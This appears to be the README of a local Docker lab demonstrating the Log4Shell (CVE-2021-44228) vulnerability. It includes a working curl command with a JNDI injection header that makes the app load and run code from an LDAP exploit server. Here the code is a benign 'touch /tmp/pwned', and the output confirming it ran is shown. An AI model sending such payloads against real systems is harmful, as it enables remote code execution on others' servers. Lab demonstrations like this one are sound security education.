# Log4Shell CVE-2021-44228 Demo
## Environment Setup

### LDAP server

Firstly build a docker image with ldap exploit `docker build -t iteratec.io/log4shell-ldap-exploit ./ldap`

### Vulnerable app

Firstly build a docker image with ldap exploit `docker build -t iteratec.io/log4shell-vulnerable-app ./log4shell-vulnerable-app`

### Run

Use provided docker-compose to start vunerable application and ldap server exploit.

If you are using Podman:

`podman-compose -f docker-compose.yml -p log4shell-demo up -d`

## Executing remote code

Once your containers are up you may try to execute some remote code:

`curl localhost:8080  -H 'X-Api-Version: ${jndi:ldap://172.16.238.10:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'`

The Base64 param value is actual command that is beeing executed:
```
➜ echo 'dG91Y2ggL3RtcC9wd25lZAo=' | base64 -D
touch /tmp/pwned
```

### Verify

You can verify that the _/tmp/pwned_ file has been created.
```
➜ docker exec log4shell-app-1 ls -la /tmp

total 28
drwxrwxrwt    1 root     root          4096 Nov 21 20:57 .
drwxr-xr-x    1 root     root          4096 Nov 21 20:41 ..
drwxr-xr-x    2 root     root          4096 Nov 21 20:57 hsperfdata_root
-rw-r--r--    1 root     root             0 Nov 21 20:57 pwned
drwx------    2 root     root          4096 Nov 21 20:57 tomcat-docbase.8080.7482410478278179066
drwx------    3 root     root          4096 Nov 21 20:57 tomcat.8080.5953130939003932607
drwx------    3 root     root          4096 Nov 21 20:42 tomcat.8080.6143343860570001124
drwx------    3 root     root          4096 Nov 21 20:41 tomcat.8080.8599857554077526416
```